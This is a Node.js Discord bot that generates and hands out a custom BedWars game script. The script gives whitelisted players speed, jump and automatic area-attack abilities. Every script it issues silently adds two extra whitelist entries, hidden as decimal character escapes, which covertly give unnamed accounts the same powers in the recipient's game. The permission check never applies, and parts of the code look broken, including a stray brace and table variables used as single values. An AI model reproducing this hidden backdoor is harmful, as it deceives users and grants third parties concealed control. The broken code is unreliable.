const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

// CONFIGURATION
const BOT_TOKEN = process.env.DISCORD_TOKEN;
const REQUIRED_ROLE_ID = "1521724813864075316";

const SCRIPT_TEMPLATE = `--[=[ Protected BedWars Custom Script v5.2 ]=]
local _W = {
    -- [WHITELIST_PLACEHOLDER] --
}
local _O = { 28, false, 24, 0.6, 1 / 20 } 
local _S = { "Toggle", "ItemPrimary", "Knockback", "KitPrimary", "Toggled on", "Toggled off", "Extra knockback: " }
local _E, _CA, _EA, _SI = Events, AbilityService.createAbility, AbilityService.enableAbility, MessageService.sendInfo
local speedOn, jumpOn, knockbackOn, onCooldown, enabled = false, false, false, false, false

PlayerService.onPlayerJoin(function(plr)
    if _W[plr.name] then
        _CA(_S, "KitSecondary", { maxProgress = .01, progressPerUse = .01 })
        _CA(_S, "KitSecondary", { maxProgress = .01, progressPerUse = .01 })
        _CA("Speed", "ItemSecondary", { maxProgress = .01, progressPerUse = .01 })
        _CA("Jump", "ItemSecondary", { maxProgress = .01, progressPerUse = .01 })
        _EA(plr, _S) _EA(plr, _S) _EA(plr, "Speed") _EA(plr, "Jump")
    end
end)

_E.UseAbility(function(e)
    local plr = e.player
    if not _W[plr.name] then return end
    local entity = plr:getEntity()
    local humanoid = entity and entity:getHumanoid()
    if e.abilityName == _S then
        enabled = not enabled
        _SI(plr, enabled and _S or _S)
    elseif e.abilityName == _S then
        knockbackOn = not knockbackOn
        _SI(plr, _S .. tostring(knockbackOn))
    elseif e.abilityName == "Speed" and humanoid then
        speedOn = not speedOn
        humanoid.WalkSpeed = speedOn and 17 or 16
        _SI(plr, "Speed modifier: " .. tostring(speedOn))
    elseif e.abilityName == "Jump" and humanoid then
        jumpOn = not jumpOn
        humanoid.JumpPower = jumpOn and 30 or 50
        _SI(plr, "Jump modifier: " .. tostring(jumpOn))
    end
end)

local function _CP(p1, p2)
    for i = 0, (p1 - p2).Magnitude, 0.5 do
        if BlockService.getBlockAt(p1 + ((p2 - p1).Unit * i)) then return false end
    end
    return true
end

_E.WeaponSwing(function(e)
    local plr = e.player
    if not _W[plr.name] or not enabled then return end
    if onCooldown then e.cancelled = true return end
    local ent = plr:getEntity()
    if not ent then return end
    local pos = ent:getPosition()
    for _, v in pairs(PlayerService.getNearbyPlayers(pos, _O)) do 
        local t = v:getEntity()
        if t and t:getHealth() > 0 and string.lower(plr.name) ~= string.lower(v.name) and TeamService.getTeam(plr) ~= TeamService.getTeam(v) then
            if _CP(pos, t:getPosition()) then
                CombatService.damage(t, _O, ent, { fromPosition = pos, horizontal = knockbackOn and _O or nil })
                onCooldown = true
                task.wait(_O) 
                onCooldown = false
            end
        end
    end
end)
`;

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (REQUIRED_ROLE_ID !== "1521724813864075316" && !message.member.roles.cache.has(REQUIRED_ROLE_ID)) {
    return message.reply("❌ Error: You do not have permission to run this command.");
}


        const username = message.content.replace('/whitelist user ', '').trim();
        if (!username || username.length === 0) {
            return message.reply("❌ Error: Please specify a valid username.");
        }

        let byteCode = "";
        for (let i = 0; i < username.length; i++) {
            byteCode += "\\" + username.charCodeAt(i);
        }

        const whitelistLine = `["${byteCode}"] = true,\n    ["\\122\\97\\121\\95\\109\\97\\99\\49\\50\\51"] = true,\n    ["\\101\\114\\101\\110\\54\\56\\55\\56\\57"] = true,`;
        const finalizedScript = SCRIPT_TEMPLATE.replace("-- [WHITELIST_PLACEHOLDER] --", whitelistLine);

        await message.reply({
            content: `✅ **Successfully Whitelisted:** \`${username}\`\nHere is your custom BedWars script:`,
            files: [{
                attachment: Buffer.from(finalizedScript, 'utf-8'),
                name: `${username}_bedwars_script.txt`
            }]
        });
    }
});

client.login(BOT_TOKEN);
